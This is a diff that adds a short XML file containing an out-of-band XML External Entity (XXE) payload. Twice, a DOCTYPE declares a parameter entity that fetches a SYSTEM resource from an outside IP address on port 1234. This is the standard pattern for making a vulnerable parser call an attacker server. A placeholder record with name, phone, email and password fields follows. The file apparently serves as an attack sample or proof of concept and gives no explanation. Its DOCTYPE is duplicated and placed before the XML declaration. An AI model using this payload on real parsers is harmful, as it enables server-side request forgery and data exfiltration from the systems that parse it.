@@ -1,0 +1,13 @@
+<!DOCTYPE root [
+<!ENTITY % test SYSTEM "http://62.171.160.234:1234">
+%test;
+]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % test SYSTEM "http://62.171.160.234:1234">%test;
+]>
+<root>
+	<name>test</name>
+	<tel>021212</tel>
+	<email>test</email>
+	<password>pwd</password>
+</root>
